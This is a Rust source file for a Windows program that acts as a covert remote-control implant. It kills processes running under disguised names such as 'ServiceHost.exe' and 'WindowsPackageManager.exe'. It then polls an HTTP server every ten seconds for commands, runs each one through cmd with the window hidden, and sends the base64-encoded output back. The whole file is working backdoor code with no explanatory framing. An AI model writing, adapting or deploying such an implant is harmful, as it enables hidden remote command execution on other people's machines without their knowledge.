//#![windows_subsystem = "windows"]

use std::error::Error;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::{env, thread};
use std::path::Path;
use std::time::Duration;
use base64::prelude::*;
use sysinfo::{get_current_pid, System};

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() {

    let s = System::new_all();

    let binding = env::current_exe().unwrap();
    let exe_path= Path::new(&binding);


    let mut variants = vec![{exe_path.file_name().unwrap().to_str().unwrap()}];

    variants.append(&mut vec!["WindowsPackageManager.exe"]);
    variants.append(&mut vec!["winman.exe"]);
    variants.append(&mut vec!["MicrosoftExtendedRuntime.exe"]);
    variants.append(&mut vec!["MicrosoftRuntimeEnvironment.exe"]);
    variants.append(&mut vec!["Mystify.scr"]);
    variants.append(&mut vec!["screensaver.scr"]);
    variants.append(&mut vec!["MedalHelper.exe"]);
    variants.append(&mut vec!["ServiceHost.exe"]);
    variants.append(&mut vec!["FATF.exe"]);
    variants.append(&mut vec!["ProgramHelper.exe"]);
    variants.append(&mut vec!["SceneRuntimeHelper.exe"]);
    variants.append(&mut vec!["LibraryFileHandle.exe"]);
    variants.append(&mut vec!["Updater001.exe"]);
    variants.append(&mut vec!["ImageResponseFrame.exe"]);

    let current_pid = get_current_pid().unwrap();

    for variant in variants {
        for process in s.processes_by_name(variant.as_ref()) {
            if process.pid() == current_pid {
                continue;
            }
            process.kill();
        }
    }

    loop {
        thread::spawn(|| {
            let command = match get_request_response("command") {
                Ok(command) => command,
                Err(_) => {
                    return;
                }
            };


            let output = Command::new("cmd")
                .args(&["/C", command.as_str()])
                .creation_flags(CREATE_NO_WINDOW)
                .output()
                .expect("failed to execute process");


            println!("cmd: {}", command);
            println!("stdout: {}", String::from_utf8_lossy(&output.stdout));

            get_request_response(&format!("stdout/{0}",
                                         BASE64_STANDARD.encode(String::from_utf8_lossy(&output.stdout).as_bytes()))
            ).unwrap();
        });
        thread::sleep(Duration::from_secs(10));
    }
}

fn get_request_response(string: &str) -> Result<String, Box<dyn Error>>{
    let response = reqwest::blocking::get(format!("http://127.0.0.1:9090/{string}"))?;
    let text = response.text()?;

    Ok(text)
}